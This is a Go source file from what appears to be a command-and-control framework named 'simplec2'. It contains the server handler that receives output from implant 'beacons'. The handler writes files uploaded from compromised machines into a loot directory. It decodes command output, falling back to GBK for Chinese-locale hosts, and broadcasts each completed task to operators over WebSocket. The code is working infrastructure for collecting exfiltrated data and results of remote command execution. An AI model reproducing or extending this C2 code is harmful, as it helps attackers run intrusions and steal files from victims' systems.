package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"simplec2/pkg/bridge"
)

func (s *server) PushBeaconOutput(ctx context.Context, in *bridge.PushBeaconOutputRequest) (*bridge.PushBeaconOutputResponse, error) {
	log.Printf("Received PushBeaconOutput for task %s from beacon: %s", in.TaskId, in.BeaconId)

	task, err := s.Store.GetTask(in.TaskId)
	if err != nil {
		log.Printf("Error finding task %s: %v", in.TaskId, err)
		return nil, err
	}

	var outputMessage string
	if task.Command == "upload" {
		originalPath := filepath.Base(task.Arguments)
		lootFileName := fmt.Sprintf("%s_%s", task.TaskID, originalPath)
		lootFilePath := filepath.Join(s.Config.LootDir, lootFileName)

		if err := os.WriteFile(lootFilePath, in.Output, 0644); err != nil {
			log.Printf("Error saving uploaded file for task %s: %v", task.TaskID, err)
			outputMessage = fmt.Sprintf("Failed to save uploaded file: %v", err)
		} else {
			log.Printf("Saved uploaded file to %s", lootFilePath)
			outputMessage = lootFileName
		}
	} else if task.Command == "exit" {
		outputMessage = "Beacon received exit command."
	} else {
		if utf8.Valid(in.Output) {
			outputMessage = string(in.Output)
		} else {
			decoder := simplifiedchinese.GBK.NewDecoder()
			utf8Bytes, _, err := transform.Bytes(decoder, in.Output)
			if err == nil {
				outputMessage = string(utf8Bytes)
			} else {
				outputMessage = strings.ToValidUTF8(string(in.Output), "\uFFFD")
			}
		}
	}

	task.Status = "completed"
	task.Output = outputMessage
	if err := s.Store.UpdateTask(task); err != nil {
		log.Printf("Error updating task output: %v", err)
		return nil, err
	}

	// Broadcast the task update event via WebSocket
	event := struct {
		Type    string      `json:"type"`
		Payload interface{} `json:"payload"`
	}{
		Type:    "TASK_OUTPUT",
		Payload: task,
	}
	eventBytes, err := json.Marshal(event)
	if err != nil {
		log.Printf("Error marshalling task output event: %v", err)
	} else {
		s.Hub.Broadcast(eventBytes)
		log.Printf("Broadcasted TASK_OUTPUT event for %s", task.TaskID)
	}

	return &bridge.PushBeaconOutputResponse{}, nil
}
